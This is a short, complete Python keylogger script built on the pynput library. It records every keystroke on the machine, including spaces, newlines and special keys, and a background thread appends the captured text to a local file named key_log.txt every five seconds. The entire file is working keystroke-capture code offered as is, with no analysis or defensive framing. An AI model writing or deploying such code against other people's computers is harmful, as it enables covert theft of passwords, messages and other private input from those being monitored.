import pynput.keyboard as keyboard
import threading
import time

class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.log = ""
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        # Start a thread to save logs periodically
        self.log_thread = threading.Thread(target=self.save_log_periodically)
        self.log_thread.daemon = True
        self.log_thread.start()

    def on_key_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += ' '
            elif key == keyboard.Key.enter:
                self.log += '\n'
            else:
                self.log += f' [{key}] '

    def save_log(self):
        with open(self.log_file, 'a') as file:
            file.write(self.log)
        self.log = ""  # Clear the log after saving

    def save_log_periodically(self):
        while True:
            self.save_log()
            time.sleep(5)  # Save every 5 seconds

    def start(self):
        with self.listener:
            self.listener.join()

if __name__ == "__main__":
    log_file = "key_log.txt"
    keylogger = Keylogger(log_file)
    print(f"Logging keystrokes to {log_file}...")
    keylogger.start()
